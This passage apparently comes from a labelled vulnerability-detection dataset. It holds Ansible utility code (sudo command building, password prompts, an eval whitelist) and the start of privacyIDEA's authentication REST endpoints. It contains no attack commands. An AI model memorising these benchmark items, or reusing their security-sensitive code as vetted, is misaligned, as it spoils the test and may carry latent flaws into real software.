AttributeError):\n                return ''\n        f = open(os.path.join(repo_path, \"HEAD\"))\n        branch = f.readline().split('/')[-1].rstrip(\"\\n\")\n        f.close()\n        branch_path = os.path.join(repo_path, \"refs\", \"heads\", branch)\n        if os.path.exists(branch_path):\n            f = open(branch_path)\n            commit = f.readline()[:10]\n            f.close()\n            date = time.localtime(os.stat(branch_path).st_mtime)\n            if time.daylight == 0:\n                offset = time.timezone\n            else:\n                offset = time.altzone\n            result = \"({0} {1}) last updated {2} (GMT {3:+04d})\".format(branch, commit,\n                time.strftime(\"%Y/%m/%d %H:%M:%S\", date), offset / -36)\n    else:\n        result = ''\n    return result\n\ndef version(prog):\n    result = \"{0} {1}\".format(prog, __version__)\n    gitinfo = _gitinfo()\n    if gitinfo:\n        result = result + \" {0}\".format(gitinfo)\n    return result\n\ndef getch():\n    ''' read in a single character '''\n    fd = sys.stdin.fileno()\n    old_settings = termios.tcgetattr(fd)\n    try:\n        tty.setraw(sys.stdin.fileno())\n        ch = sys.stdin.read(1)\n    finally:\n        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)\n    return ch\n\ndef sanitize_output(str):\n    ''' strips private info out of a string '''\n\n    private_keys = ['password', 'login_password']\n\n    filter_re = [\n        # filter out things like user:pass@foo/whatever\n        # and http://username:pass@wherever/foo\n        re.compile('^(?P<before>.*:)(?P<password>.*)(?P<after>\\@.*)$'),\n    ]\n\n    parts = str.split()\n    output = ''\n    for part in parts:\n        try:\n            (k,v) = part.split('=', 1)\n            if k in private_keys:\n                output += \" %s=VALUE_HIDDEN\" % k\n            else:\n                found = False\n                for filter in filter_re:\n                    m = filter.match(v)\n                    if m:\n                        d = m.groupdict()\n                        output += \" %s=%s\" % (k, d['before'] + \"********\" + d['after'])\n                        found = True\n                        break\n                if not found:\n                    output += \" %s\" % part\n        except:\n            output += \" %s\" % part\n\n    return output.strip()\n\n####################################################################\n# option handling code for /usr/bin/ansible and ansible-playbook\n# below this line\n\nclass SortedOptParser(optparse.OptionParser):\n    '''Optparser which sorts the options by opt before outputting --help'''\n\n    def format_help(self, formatter=None):\n        self.option_list.sort(key=operator.methodcaller('get_opt_string'))\n        return optparse.OptionParser.format_help(self, formatter=None)\n\ndef increment_debug(option, opt, value, parser):\n    global VERBOSITY\n    VERBOSITY += 1\n\ndef base_parser(constants=C, usage=\"\", output_opts=False, runas_opts=False,\n    async_opts=False, connect_opts=False, subset_opts=False, check_opts=False, diff_opts=False):\n    ''' create an options parser for any ansible script '''\n\n    parser = SortedOptParser(usage, version=version(\"%prog\"))\n    parser.add_option('-v','--verbose', default=False, action=\"callback\",\n        callback=increment_debug, help=\"verbose mode (-vvv for more, -vvvv to enable connection debugging)\")\n\n    parser.add_option('-f','--forks', dest='forks', default=constants.DEFAULT_FORKS, type='int',\n        help=\"specify number of parallel processes to use (default=%s)\" % constants.DEFAULT_FORKS)\n    parser.add_option('-i', '--inventory-file', dest='inventory',\n        help=\"specify inventory host file (default=%s)\" % constants.DEFAULT_HOST_LIST,\n        default=constants.DEFAULT_HOST_LIST)\n    parser.add_option('-k', '--ask-pass', default=False, dest='ask_pass', action='store_true',\n        help='ask for SSH password')\n    parser.add_option('--private-key', default=C.DEFAULT_PRIVATE_KEY_FILE, dest='private_key_file',\n        help='use this file to authenticate the connection')\n    parser.add_option('-K', '--ask-sudo-pass', default=False, dest='ask_sudo_pass', action='store_true',\n        help='ask for sudo password')\n    parser.add_option('--ask-su-pass', default=False, dest='ask_su_pass', action='store_true', \n        help='ask for su password')\n    parser.add_option('--ask-vault-pass', default=False, dest='ask_vault_pass', action='store_true', \n        help='ask for vault password')\n    parser.add_option('--vault-password-file', default=None, dest='vault_password_file',\n        help=\"vault password file\")\n    parser.add_option('--list-hosts', dest='listhosts', action='store_true',\n        help='outputs a list of matching hosts; does not execute anything else')\n    parser.add_option('-M', '--module-path', dest='module_path',\n        help=\"specify path(s) to module library (default=%s)\" % constants.DEFAULT_MODULE_PATH,\n        default=None)\n\n    if subset_opts:\n        parser.add_option('-l', '--limit', default=constants.DEFAULT_SUBSET, dest='subset',\n            help='further limit selected hosts to an additional pattern')\n\n    parser.add_option('-T', '--timeout', default=constants.DEFAULT_TIMEOUT, type='int',\n        dest='timeout',\n        help=\"override the SSH timeout in seconds (default=%s)\" % constants.DEFAULT_TIMEOUT)\n\n    if output_opts:\n        parser.add_option('-o', '--one-line', dest='one_line', action='store_true',\n            help='condense output')\n        parser.add_option('-t', '--tree', dest='tree', default=None,\n            help='log output to this directory')\n\n    if runas_opts:\n        parser.add_option(\"-s\", \"--sudo\", default=constants.DEFAULT_SUDO, action=\"store_true\",\n            dest='sudo', help=\"run operations with sudo (nopasswd)\")\n        parser.add_option('-U', '--sudo-user', dest='sudo_user', default=None,\n                          help='desired sudo user (default=root)')  # Can't default to root because we need to detect when this option was given\n        parser.add_option('-u', '--user', default=constants.DEFAULT_REMOTE_USER,\n            dest='remote_user', help='connect as this user (default=%s)' % constants.DEFAULT_REMOTE_USER)\n\n        parser.add_option('-S', '--su', default=constants.DEFAULT_SU,\n                          action='store_true', help='run operations with su')\n        parser.add_option('-R', '--su-user', help='run operations with su as this '\n                                                  'user (default=%s)' % constants.DEFAULT_SU_USER)\n\n    if connect_opts:\n        parser.add_option('-c', '--connection', dest='connection',\n                          default=C.DEFAULT_TRANSPORT,\n                          help=\"connection type to use (default=%s)\" % C.DEFAULT_TRANSPORT)\n\n    if async_opts:\n        parser.add_option('-P', '--poll', default=constants.DEFAULT_POLL_INTERVAL, type='int',\n            dest='poll_interval',\n            help=\"set the poll interval if using -B (default=%s)\" % constants.DEFAULT_POLL_INTERVAL)\n        parser.add_option('-B', '--background', dest='seconds', type='int', default=0,\n            help='run asynchronously, failing after X seconds (default=N/A)')\n\n    if check_opts:\n        parser.add_option(\"-C\", \"--check\", default=False, dest='check', action='store_true',\n            help=\"don't make any changes; instead, try to predict some of the changes that may occur\"\n        )\n\n    if diff_opts:\n        parser.add_option(\"-D\", \"--diff\", default=False, dest='diff', action='store_true',\n            help=\"when changing (small) files and templates, show the differences in those files; works great with --check\"\n        )\n\n\n    return parser\n\ndef ask_vault_passwords(ask_vault_pass=False, ask_new_vault_pass=False, confirm_vault=False, confirm_new=False):\n\n    vault_pass = None\n    new_vault_pass = None\n\n    if ask_vault_pass:\n        vault_pass = getpass.getpass(prompt=\"Vault password: \")\n\n    if ask_vault_pass and confirm_vault:\n        vault_pass2 = getpass.getpass(prompt=\"Confirm Vault password: \")\n        if vault_pass != vault_pass2:\n            raise errors.AnsibleError(\"Passwords do not match\")\n\n    if ask_new_vault_pass:\n        new_vault_pass = getpass.getpass(prompt=\"New Vault password: \")\n\n    if ask_new_vault_pass and confirm_new:\n        new_vault_pass2 = getpass.getpass(prompt=\"Confirm New Vault password: \")\n        if new_vault_pass != new_vault_pass2:\n            raise errors.AnsibleError(\"Passwords do not match\")\n\n    # enforce no newline chars at the end of passwords\n    if vault_pass:\n        vault_pass = vault_pass.strip()\n    if new_vault_pass:\n        new_vault_pass = new_vault_pass.strip()\n\n    return vault_pass, new_vault_pass\n\ndef ask_passwords(ask_pass=False, ask_sudo_pass=False, ask_su_pass=False, ask_vault_pass=False):\n    sshpass = None\n    sudopass = None\n    su_pass = None\n    vault_pass = None\n    sudo_prompt = \"sudo password: \"\n    su_prompt = \"su password: \"\n\n    if ask_pass:\n        sshpass = getpass.getpass(prompt=\"SSH password: \")\n        sudo_prompt = \"sudo password [defaults to SSH password]: \"\n\n    if ask_sudo_pass:\n        sudopass = getpass.getpass(prompt=sudo_prompt)\n        if ask_pass and sudopass == '':\n            sudopass = sshpass\n\n    if ask_su_pass:\n        su_pass = getpass.getpass(prompt=su_prompt)\n\n    if ask_vault_pass:\n        vault_pass = getpass.getpass(prompt=\"Vault password: \")\n\n    return (sshpass, sudopass, su_pass, vault_pass)\n\ndef do_encrypt(result, encrypt, salt_size=None, salt=None):\n    if PASSLIB_AVAILABLE:\n        try:\n            crypt = getattr(passlib.hash, encrypt)\n        except:\n            raise errors.AnsibleError(\"passlib does not support '%s' algorithm\" % encrypt)\n\n        if salt_size:\n            result = crypt.encrypt(result, salt_size=salt_size)\n        elif salt:\n            result = crypt.encrypt(result, salt=salt)\n        else:\n            result = crypt.encrypt(result)\n    else:\n        raise errors.AnsibleError(\"passlib must be installed to encrypt vars_prompt values\")\n\n    return result\n\ndef last_non_blank_line(buf):\n\n    all_lines = buf.splitlines()\n    all_lines.reverse()\n    for line in all_lines:\n        if (len(line) > 0):\n            return line\n    # shouldn't occur unless there's no output\n    return \"\"\n\ndef filter_leading_non_json_lines(buf):\n    '''\n    used to avoid random output from SSH at the top of JSON output, like messages from\n    tcagetattr, or where dropbear spews MOTD on every single command (which is nuts).\n\n    need to filter anything which starts not with '{', '[', ', '=' or is an empty line.\n    filter only leading lines since multiline JSON is valid.\n    '''\n\n    kv_regex = re.compile(r'.*\\w+=\\w+.*')\n    filtered_lines = StringIO.StringIO()\n    stop_filtering = False\n    for line in buf.splitlines():\n        if stop_filtering or kv_regex.match(line) or line.startswith('{') or line.startswith('['):\n            stop_filtering = True\n            filtered_lines.write(line + '\\n')\n    return filtered_lines.getvalue()\n\ndef boolean(value):\n    val = str(value)\n    if val.lower() in [ \"true\", \"t\", \"y\", \"1\", \"yes\" ]:\n        return True\n    else:\n        return False\n\ndef make_sudo_cmd(sudo_user, executable, cmd):\n    \"\"\"\n    helper function for connection plugins to create sudo commands\n    \"\"\"\n    # Rather than detect if sudo wants a password this time, -k makes\n    # sudo always ask for a password if one is required.\n    # Passing a quoted compound command to sudo (or sudo -s)\n    # directly doesn't work, so we shellquote it with pipes.quote()\n    # and pass the quoted string to the user's shell.  We loop reading\n    # output until we see the randomly-generated sudo prompt set with\n    # the -p option.\n    randbits = ''.join(chr(random.randint(ord('a'), ord('z'))) for x in xrange(32))\n    prompt = '[sudo via ansible, key=%s] password: ' % randbits\n    success_key = 'SUDO-SUCCESS-%s' % randbits\n    sudocmd = '%s -k && %s %s -S -p \"%s\" -u %s %s -c %s' % (\n        C.DEFAULT_SUDO_EXE, C.DEFAULT_SUDO_EXE, C.DEFAULT_SUDO_FLAGS,\n        prompt, sudo_user, executable or '$SHELL', pipes.quote('echo %s; %s' % (success_key, cmd)))\n    return ('/bin/sh -c ' + pipes.quote(sudocmd), prompt, success_key)\n\n\ndef make_su_cmd(su_user, executable, cmd):\n    \"\"\"\n    Helper function for connection plugins to create direct su commands\n    \"\"\"\n    # TODO: work on this function\n    randbits = ''.join(chr(random.randint(ord('a'), ord('z'))) for x in xrange(32))\n    prompt = '[Pp]assword: ?$'\n    success_key = 'SUDO-SUCCESS-%s' % randbits\n    sudocmd = '%s %s %s -c \"%s -c %s\"' % (\n        C.DEFAULT_SU_EXE, C.DEFAULT_SU_FLAGS, su_user, executable or '$SHELL',\n        pipes.quote('echo %s; %s' % (success_key, cmd))\n    )\n    return ('/bin/sh -c ' + pipes.quote(sudocmd), prompt, success_key)\n\n_TO_UNICODE_TYPES = (unicode, type(None))\n\ndef to_unicode(value):\n    if isinstance(value, _TO_UNICODE_TYPES):\n        return value\n    return value.decode(\"utf-8\")\n\ndef get_diff(diff):\n    # called by --diff usage in playbook and runner via callbacks\n    # include names in diffs 'before' and 'after' and do diff -U 10\n\n    try:\n        with warnings.catch_warnings():\n            warnings.simplefilter('ignore')\n            ret = []\n            if 'dst_binary' in diff:\n                ret.append(\"diff skipped: destination file appears to be binary\\n\")\n            if 'src_binary' in diff:\n                ret.append(\"diff skipped: source file appears to be binary\\n\")\n            if 'dst_larger' in diff:\n                ret.append(\"diff skipped: destination file size is greater than %d\\n\" % diff['dst_larger'])\n            if 'src_larger' in diff:\n                ret.append(\"diff skipped: source file size is greater than %d\\n\" % diff['src_larger'])\n            if 'before' in diff and 'after' in diff:\n                if 'before_header' in diff:\n                    before_header = \"before: %s\" % diff['before_header']\n                else:\n                    before_header = 'before'\n                if 'after_header' in diff:\n                    after_header = \"after: %s\" % diff['after_header']\n                else:\n                    after_header = 'after'\n                differ = difflib.unified_diff(to_unicode(diff['before']).splitlines(True), to_unicode(diff['after']).splitlines(True), before_header, after_header, '', '', 10)\n                for line in list(differ):\n                    ret.append(line)\n            return u\"\".join(ret)\n    except UnicodeDecodeError:\n        return \">> the files are different, but the diff library cannot compare unicode strings\"\n\ndef is_list_of_strings(items):\n    for x in items:\n        if not isinstance(x, basestring):\n            return False\n    return True\n\ndef list_union(a, b):\n    result = []\n    for x in a:\n        if x not in result:\n            result.append(x)\n    for x in b:\n        if x not in result:\n            result.append(x)\n    return result\n\ndef list_intersection(a, b):\n    result = []\n    for x in a:\n        if x in b and x not in result:\n            result.append(x)\n    return result\n\ndef safe_eval(expr, locals={}, include_exceptions=False):\n    '''\n    this is intended for allowing things like:\n    with_items: a_list_variable\n    where Jinja2 would return a string\n    but we do not want to allow it to call functions (outside of Jinja2, where\n    the env is constrained)\n\n    Based on:\n    http://stackoverflow.com/questions/12523516/using-ast-and-whitelists-to-make-pythons-eval-safe\n    '''\n\n    # this is the whitelist of AST nodes we are going to \n    # allow in the evaluation. Any node type other than \n    # those listed here will raise an exception in our custom\n    # visitor class defined below.\n    SAFE_NODES = set(\n        (\n            ast.Expression,\n            ast.Compare,\n            ast.Str,\n            ast.List,\n            ast.Tuple,\n            ast.Dict,\n            ast.Call,\n            ast.Load,\n            ast.BinOp,\n            ast.UnaryOp,\n            ast.Num,\n            ast.Name,\n            ast.Add,\n            ast.Sub,\n            ast.Mult,\n            ast.Div,\n        )\n    )\n\n    # AST node types were expanded after 2.6\n    if not sys.version.startswith('2.6'):\n        SAFE_NODES.union(\n            set(\n                (ast.Set,)\n            )\n        )\n\n    # builtin functions that are safe to call\n    BUILTIN_WHITELIST = [\n        'abs', 'all', 'any', 'basestring', 'bin', 'bool', 'buffer', 'bytearray',\n        'bytes', 'callable', 'chr', 'cmp', 'coerce', 'complex', 'copyright', 'credits',\n        'dict', 'dir', 'divmod', 'enumerate', 'exit', 'float', 'format', 'frozenset',\n        'getattr', 'globals', 'hasattr', 'hash', 'hex', 'id', 'int', 'intern',\n        'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long',\n        'map', 'max', 'memoryview', 'min', 'next', 'oct', 'ord', 'pow', 'print',\n        'property', 'quit', 'range', 'reversed', 'round', 'set', 'slice', 'sorted',\n        'str', 'sum', 'tuple', 'unichr', 'unicode', 'vars', 'xrange', 'zip',\n    ]\n\n    filter_list = []\n    for filter in filter_loader.all():\n        filter_list.extend(filter.filters().keys())\n\n    CALL_WHITELIST = BUILTIN_WHITELIST + filter_list + C.DEFAULT_CALLABLE_WHITELIST\n\n    class CleansingNodeVisitor(ast.NodeVisitor):\n        def generic_visit(self, node):\n            if type(node) not in SAFE_NODES:\n                raise Exception(\"invalid expression (%s)\" % expr)\n            super(CleansingNodeVisitor, self).generic_visit(node)\n        def visit_Call(self, call):\n            if call.func.id not in CALL_WHITELIST:\n                raise Exception(\"invalid function: %s\" % call.func.id)\n\n    if not isinstance(expr, basestring):\n        # already templated to a datastructure, perhaps?\n        if include_exceptions:\n            return (expr, None)\n        return expr\n\n    try:\n        parsed_tree = ast.parse(expr, mode='eval')\n        cnv = CleansingNodeVisitor()\n        cnv.visit(parsed_tree)\n        compiled = compile(parsed_tree, expr, 'eval')\n        result = eval(compiled, {}, locals)\n\n        if include_exceptions:\n            return (result, None)\n        else:\n            return result\n    except SyntaxError, e:\n        # special handling for syntax errors, we just return\n        # the expression string back as-is\n        if include_exceptions:\n            return (expr, None)\n        return expr\n    except Exception, e:\n        if include_exceptions:\n            return (expr, e)\n        return expr\n\n\ndef listify_lookup_plugin_terms(terms, basedir, inject):\n\n    if isinstance(terms, basestring):\n        # someone did:\n        #    with_items: alist\n        # OR\n        #    with_items: {{ alist }}\n\n        stripped = terms.strip()\n        if not (stripped.startswith('{') or stripped.startswith('[')) and not stripped.startswith(\"/\") and not stripped.startswith('set(['):\n            # if not already a list, get ready to evaluate with Jinja2\n            # not sure why the \"/\" is in above code :)\n            try:\n                new_terms = template.template(basedir, \"{{ %s }}\" % terms, inject)\n                if isinstance(new_terms, basestring) and \"{{\" in new_terms:\n                    pass\n                else:\n                    terms = new_terms\n            except:\n                pass\n\n        if '{' in terms or '[' in terms:\n            # Jinja2 already evaluated a variable to a list.\n            # Jinja2-ified list needs to be converted back to a real type\n            # TODO: something a bit less heavy than eval\n            return safe_eval(terms)\n\n        if isinstance(terms, basestring):\n            terms = [ terms ]\n\n    return terms\n\ndef combine_vars(a, b):\n\n    if C.DEFAULT_HASH_BEHAVIOUR == \"merge\":\n        return merge_hash(a, b)\n    else:\n        return dict(a.items() + b.items())\n\ndef random_password(length=20, chars=C.DEFAULT_PASSWORD_CHARS):\n    '''Return a random password string of length containing only chars.'''\n\n    password = []\n    while len(password) < length:\n        new_char = os.urandom(1)\n        if new_char in chars:\n            password.append(new_char)\n\n    return ''.join(password)\n\ndef before_comment(msg):\n    ''' what's the part of a string before a comment? '''\n    msg = msg.replace(\"\\#\",\"**NOT_A_COMMENT**\")\n    msg = msg.split(\"#\")[0]\n    msg = msg.replace(\"**NOT_A_COMMENT**\",\"#\")\n    return msg\n\n\n\n", "target": 0}
{"idx": 976, "func": "# -*- coding: utf-8 -*-\n#\n# http://www.privacyidea.org\n# (c) cornelius k\u00f6lbel, privacyidea.org\n#\n# 2018-01-22 Cornelius K\u00f6lbel <cornelius.koelbel@netknights.it>\n#            Add offline refill\n# 2016-12-20 Cornelius K\u00f6lbel <cornelius.koelbel@netknights.it>\n#            Add triggerchallenge endpoint\n# 2016-10-23 Cornelius K\u00f6lbel <cornelius.koelbel@netknights.it>\n#            Add subscription decorator\n# 2016-09-05 Cornelius K\u00f6lbel <cornelius.koelbel@netknights.it>\n#            SAML attributes on fail\n# 2016-08-30 Cornelius K\u00f6lbel <cornelius.koelbel@netknights.it>\n#            save client application type to database\n# 2016-08-09 Cornelius K\u00f6lbel <cornelius@privacyidea.org>\n#            Add possiblity to check OTP only\n# 2015-11-19 Cornelius K\u00f6lbel <cornelius@privacyidea.org>\n#            Add support for transaction_id to saml_check\n# 2015-06-17 Cornelius K\u00f6lbel <cornelius@privacyidea.org>\n#            Add policy decorator for API key requirement\n# 2014-12-08 Cornelius K\u00f6lbel, <cornelius@privacyidea.org>\n#            Complete rewrite during flask migration\n#            Try to provide REST API\n#\n# This code is free software; you can redistribute it and/or\n# modify it under the terms of the GNU AFFERO GENERAL PUBLIC LICENSE\n# License as published by the Free Software Foundation; either\n# version 3 of the License, or any later version.\n#\n# This code is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU AFFERO GENERAL PUBLIC LICENSE for more details.\n#\n# You should have received a copy of the GNU Affero General Public\n# License along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n\n__doc__ = \"\"\"This module contains the REST API for doing authentication.\nThe methods are tested in the file tests/test_api_validate.py\n\nAuthentication is either done by providing a username and a password or a\nserial number and a password.\n\n**Authentication workflow**\n\nAuthentication workflow is like this:\n\nIn case of authenticating a user:\n\n * :func:`privacyidea.lib.token.check_user_pass`\n * :func:`privacyidea.lib.token.check_token_list`\n * :func:`privacyidea.lib.tokenclass.TokenClass.authenticate`\n * :func:`privacyidea.lib.tokenclass.TokenClass.check_pin`\n * :func:`privacyidea.lib.tokenclass.TokenClass.check_otp`\n\nIn case if authenitcating a serial number:\n\n * :func:`privacyidea.lib.token.check_serial_pass`\n * :func:`privacyidea.lib.token.check_token_list`\n * :func:`privacyidea.lib.tokenclass.TokenClass.authenticate`\n * :func:`privacyidea.lib.tokenclass.TokenClass.check_pin`\n * :func:`privacyidea.lib.tokenclass.TokenClass.check_otp`\n\n\"\"\"\nfrom flask import (Blueprint, request, g, current_app)\nfrom privacyidea.lib.user import get_user_from_param\nfrom .lib.utils import send_result, getParam\nfrom ..lib.decorators import (check_user_or_serial_in_request)\nfrom .lib.utils import required\nfrom privacyidea.lib.error import ParameterError\nfrom privacyidea.lib.token import (check_user_pass, check_serial_pass,\n                                   check_otp)\nfrom privacyidea.api.lib.utils import get_all_params\nfrom privacyidea.lib.config import (return_saml_attributes, get_from_config,\n                                    return_saml_attributes_on_fail,\n                                    SYSCONF)\nfrom privacyidea.lib.audit import getAudit\nfrom privacyidea.api.lib.prepolicy import (prepolicy, set_realm,\n                                           api_key_required, mangle,\n                                           save_client_application_type,\n                                           check_base_action)\nfrom privacyidea.api.lib.postpolicy import (postpolicy,\n                                            check_tokentype, check_serial,\n                                            check_tokeninfo,\n                                            no_detail_on_fail,\n                                            no_detail_on_success, autoassign,\n                                            offline_info,\n                                            add_user_detail_to_response, construct_radius_response)\nfrom privacyidea.lib.policy import PolicyClass\nfrom privacyidea.lib.config import ConfigClass\nfrom privacyidea.lib.event import EventConfiguration\nimport logging\nfrom privacyidea.api.lib.postpolicy import postrequest, sign_response\nfrom privacyidea.api.auth import jwtauth\nfrom privacyidea.api.register import register_blueprint\nfrom privacyidea.api.recover import recover_blueprint\nfrom privacyidea.lib.utils import get_client_ip\nfrom privacyidea.lib.event import event\nfrom privacyidea.lib.subscriptions import CheckSubscription\nfrom privacyidea.api.auth import admin_required\nfrom privacyidea.lib.policy import ACTION\nfrom privacyidea.lib.token import get_tokens\nfrom privacyidea.lib.machine import list_token_machines\nfrom privacyidea.lib.applications.offline import MachineApplication\nimport json\n\nlog = logging.getLogger(__name__)\n\nvalidate_blueprint = Blueprint('validate_blueprint', __name__)\n\n\n@validate_blueprint.before_request\n@register_blueprint.before_request\n@recover_blueprint.before_request\ndef before_request():\n    \"\"\"\n    This is executed before the request\n    \"\"\"\n    g.config_object = ConfigClass()\n    request.all_data = get_all_params(request.values, request.data)\n    request.User = get_user_from_param(request.all_data)\n    privacyidea_server = current_app.config.get(\"PI_AUDIT_SERVERNAME\") or \\\n                         request.host\n    # Create a policy_object, that reads the database audit settings\n    # and contains the complete policy definition during the request.\n    # This audit_object can be used in the postpolicy and prepolicy and it\n    # can be passed to the innerpolicies.\n\n    g.policy_object = PolicyClass()\n\n    g.audit_object = getAudit(current_app.config)\n    g.event_config = EventConfiguration()\n    # access_route contains the ip addresses of all clients, hops and proxies.\n    g.client_ip = get_client_ip(request, get_from_config(SYSCONF.OVERRIDECLIENT))\n    g.audit_object.log({\"success\": False,\n                        \"action_detail\": \"\",\n                        \"client\": g.client_ip,\n                        \"client_user_agent\": request.user_agent.browser,\n                        \"privacyidea_server\": privacyidea_server,\n                        \"action\": \"{0!s} {1!s}\".format(request.method, request.url_rule),\n                        \"info\": \"\"})\n\n\n@validate_blueprint.after_request\n@register_blueprint.after_request\n@recover_blueprint.after_request\n@jwtauth.after_request\n@postrequest(sign_response, request=request)\ndef after_request(response):\n    \"\"\"\n    This function is called after a request\n    :return: The response\n    \"\"\"\n    # In certain error cases the before_request was not handled\n    # completely so that we do not have an audit_object\n    if \"audit_object\" in g:\n        g.audit_object.finalize_log()\n\n    # No caching!\n    response.headers['Cache-Control'] = 'no-cache'\n    return response\n\n\n@validate_blueprint.route('/offlinerefill', methods=['POST'])\n@check_user_or_serial_in_request(request)\n@event(\"validate_offlinerefill\", request, g)\ndef offlinerefill():\n    \"\"\"\n    This endpoint allows to fetch new offline OTP values for a token,\n    that is already offline.\n    According to the definition it will send the missing OTP values, so that\n    the client will have as much otp values as defined.\n\n    :param serial: The serial number of the token, that should be refilled.\n    :param refilltoken: The authorization token, that allows refilling.\n    :param pass: the last password (maybe password+OTP) entered by the user\n    :return:\n    \"\"\"\n    result = False\n    otps = {}\n    serial = getParam(request.all_data, \"serial\", required)\n    refilltoken = getParam(request.all_data, \"refilltoken\", required)\n    password = getParam(request.all_data, \"pass\", required)\n    tokenobj_list = get_tokens(serial=serial)\n    if len(tokenobj_list) != 1:\n        raise ParameterError(\"The token does not exist\")\n    else:\n        tokenobj = tokenobj_list[0]\n        machine_defs = list_token_machines(serial)\n        # check if is still an offline token:\n        for mdef in machine_defs:\n            if mdef.get(\"application\") == \"offline\":\n                # check refill token:\n                if tokenobj.get_tokeninfo(\"refilltoken\") == refilltoken:\n                    # refill\n                    otps = MachineApplication.get_refill(tokenobj, password, mdef.get(\"options\"))\n                    refilltoken = MachineApplication.generate_new_refilltoken(tokenobj)\n                    response = send_result(True)\n                    content = json.loads(response.data)\n                    content[\"auth_items\"] = {\"offline\": [{\"refilltoken\": refilltoken,\n                                                          \"response\": otps}]}\n                    response.data = json.dumps(content)\n                    return response\n        raise ParameterError(\"Token is not an offline token or refill token is incorrect\")\n\n\n@validate_blueprint.route('/check', methods=['POST', 'GET'])\n@validate_blueprint.route('/radiuscheck', methods=['POST', 'GET'])\n@postpolicy(construct_radius_response, request=request)\n@postpolicy(no_detail_on_fail, request=request)\n@postpolicy(no_detail_on_success, request=request)\n@postpolicy(add_user_detail_to_response, request=request)\n@postpolicy(offline_info, request=request)\n@postpolicy(check_tokeninfo, request=request)\n@postpolicy(check_tokentype, request=request)\n@postpolicy(check_serial, request=request)\n@postpolicy(autoassign, request=request)\n@prepolicy(set_realm, request=request)\n@prepolicy(mangle, request=request)\n@prepolicy(save_client_application_type, request=request)\n@check_user_or_serial_in_request(request)\n@CheckSubscription(request)\n@prepolicy(api_key_required, request=request)\n@event(\"validate_check\", request, g)\ndef check():\n    \"\"\"\n    check the authentication for a user or a serial number.\n    Either a ``serial`` or a ``user`` is required to authenticate.\n    The PIN and OTP value is sent in the parameter ``pass``.\n    In case of successful authentication it returns ``result->value: true``.\n\n    In case of a challenge response authentication a parameter ``exception=1``\n    can be passed. This would result in a HTTP 500 Server Error response if\n    an error occurred during sending of SMS or Email.\n\n    In case ``/validate/radiuscheck`` is requested, the responses are\n    modified as follows: A successful authentication returns an empty HTTP\n    204 response. An unsuccessful authentication returns an empty HTTP\n    400 response. Error responses are the same responses as for the\n    ``/validate/check`` endpoint.\n\n    :param serial: The serial number of the token, that tries to authenticate.\n    :param user: The loginname/username of the user, who tries to authenticate.\n    :param realm: The realm of the user, who tries to authenticate. If the\n        realm is omitted, the user is looked up in the default realm.\n    :param pass: The password, that consists of the OTP PIN and the OTP value.\n    :param otponly: If set to 1, only the OTP value is verified. This is used\n        in the management UI. Only used with the parameter serial.\n    :param transaction_id: The transaction ID for a response to a challenge\n        request\n    :param state: The state ID for a response to a challenge request\n\n    :return: a json result with a boolean \"result\": true\n\n    **Example Validation Request**:\n\n        .. sourcecode:: http\n\n           POST /validate/check HTTP/1.1\n           Host: example.com\n           Accept: application/json\n\n           user=user\n           realm=realm1\n           pass=s3cret123456\n\n    **Example response** for a successful authentication:\n\n       .. sourcecode:: http\n\n           HTTP/1.1 200 OK\n           Content-Type: application/json\n\n            {\n              \"detail\": {\n                \"message\": \"matching 1 tokens\",\n                \"serial\": \"PISP0000AB00\",\n                \"type\": \"spass\"\n              },\n              \"id\": 1,\n              \"jsonrpc\": \"2.0\",\n              \"result\": {\n                \"status\": true,\n                \"value\": true\n              },\n              \"version\": \"privacyIDEA unknown\"\n            }\n\n    **Example response** for this first part of a challenge response\n    authentication:\n\n       .. sourcecode:: http\n\n           HTTP/1.1 200 OK\n           Content-Type: application/json\n\n            {\n              \"detail\": {\n                \"serial\": \"PIEM0000AB00\",\n                \"type\": \"email\",\n                \"transaction_id\": \"12345678901234567890\",\n                \"multi_challenge: [ {\"serial\": \"PIEM0000AB00\",\n                                     \"transaction_id\":  \"12345678901234567890\",\n                                     \"message\": \"Please enter otp from your\n                                     email\"},\n                                    {\"serial\": \"PISM12345678\",\n                                     \"transaction_id\": \"12345678901234567890\",\n                                     \"message\": \"Please enter otp from your\n                                     SMS\"}\n                ]\n              },\n              \"id\": 1,\n              \"jsonrpc\": \"2.0\",\n              \"result\": {\n                \"status\": true,\n                \"value\": false\n              },\n              \"version\": \"privacyIDEA unknown\"\n            }\n\n    In this example two challenges are triggered, one with an email and one\n    with an SMS. The application and thus the user has to decide, which one\n    to use. They can use either.\n\n    .. note:: All challenge response tokens have the same transaction_id in\n       this case.\n    \"\"\"\n    #user = get_user_from_param(request.all_data)\n    user = request.User\n    serial = getParam(request.all_data, \"serial\")\n    password = getParam(request.all_data, \"pass\", required)\n    otp_only = getParam(request.all_data, \"otponly\")\n    options = {\"g\": g,\n               \"clientip\": g.client_ip}\n    # Add all params to the options\n    for key, value in request.all_data.items():\n            if value and key not in [\"g\", \"clientip\"]:\n                options[key] = value\n\n    g.audit_object.log({\"user\": user.login,\n                        \"resolver\": user.resolver,\n                        \"realm\": user.realm})\n\n    if serial:\n        if not otp_only:\n            result, details = check_serial_pass(serial, password, options=options)\n        else:\n            result, details = check_otp(serial, password)\n\n    else:\n        result, details = check_user_pass(user, password, options=options)\n\n    g.audit_object.log({\"info\": details.get(\"message\"),\n                        \"success\": result,\n                        \"serial\": serial or details.get(\"serial\"),\n                        \"tokentype\": details.get(\"type\")})\n    return send_result(result, details=details)\n\n\n@validate_blueprint.route('/samlcheck', methods=['POST', 'GET'])\n@postpolicy(no_detail_on_fail, request=request)\n@postpolicy(no_detail_on_success, request=request)\n@postpolicy(add_user_detail_to_response, request=request)\n@postpolicy(check_tokeninfo, request=request)\n@postpolicy(check_tokentype, request=request)\n@postpolicy(check_serial, request=request)\n@postpolicy(autoassign, request=request)\n@prepolicy(set_realm, request=request)\n@prepolicy(mangle, request=request)\n@prepolicy(save_client_application_type, request=request)\n@check_user_or_serial_in_request(request)\n@CheckSubscription(request)\n@prepolicy(api_key_required, request=request)\n@event(\"validate_check\", request, g)\ndef samlcheck():\n    \"\"\"\n    Authenticate the user and return the SAML user information.\n\n    :param user: The loginname/username of the user, who tries to authenticate.\n    :param realm: 